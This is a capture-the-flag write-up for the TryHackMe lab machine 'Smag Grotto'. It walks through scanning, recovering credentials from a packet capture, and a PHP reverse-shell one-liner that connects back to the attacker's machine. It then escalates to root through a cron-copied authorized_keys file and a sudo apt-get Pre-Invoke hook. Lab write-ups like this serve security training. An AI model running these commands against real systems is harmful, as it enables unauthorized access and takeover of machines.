# Smag Grotto

![Smag Grotto THM easy room](https://i.imgur.com/C5DIAQd.png)


[Play](https://tryhackme.com/room/room_name_here)

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nothing too special.


### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuste-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -219
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 311] [10.10.62.219/mail/]
```

`/mail/` looks interesting. We explore that below.

### 1.3. Web Exploration
![homepage of smag grotto](https://i.imgur.com/teZV7zS.png)


![the mail directory in the website](https://i.imgur.com/dAFRcPS.png)

We add the `smag.thm` line in `/etc/hosts` file, looking at their emails.
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.62.219    smag.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### 1.4. Wireshark
The website has a file, which we can download just by clicking on it. Exploring it further. 

In one of the packets, we found:
```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username={hidden}&password={wow_very_nice}HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Add the `development.smag.thm` along with `smag.thm` domain in the `/etc/hosts` file. It thus looks like the following.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.62.219    smag.thm development.smag.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## 2. Foothold
Logging in using the credentials from wireshark, we get a place to enter commands.
![admin panel on the subdomain and logged in using creds](https://i.imgur.com/nqqDVou.png)

I tried a bunch of commands, and this one stuck: `php -r '$sock=fsockopen("MY_KALI_IP",4444);exec("sh <&3 >&3 2>&3");'`


We get a shell!
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.62.219] 33886
bash -i
bash: cannot set terminal process group (707): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 
```

## 3. PrivEsc
Looking around, I found something intersting in `/etc/crontab` in the last line.

```
www-data@smag:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
```

We see the file `/opt/.backups/jake_id_rsa.pub.backup` is put into jake's authorized keys. This means that if I can get my own, kali SSH public key in here, I would be able to login without a password.

First, we need to make sure we have writing permissions.
```
www-data@smag:/$ ls -la /opt/.backups/jake_id_rsa.pub.backup
ls -la /opt/.backups/jake_id_rsa.pub.backup
-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup
```
Great! Now I copy pasted my own `id_rsa.pub` key here.
```
www-data@smag:/$ echo "ssh-rsa {wow_nice_looking_key_uh} kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
```

And ...
```
┌──(kali㉿kali)-[/tmp]
└─$ ssh jake@10.10.62.219      
The authenticity of host '10.10.62.219 (10.10.62.219)' can't be established.
ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.62.219' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
```
Success!

Now for PrivEsc to root. Exploring a bit, I found:
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Using [GTFOBins - apt-get sudo exploit](https://gtfobins.github.io/gtfobins/apt-get/#sudo) 
```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami 
root
# 
```
System compromised!
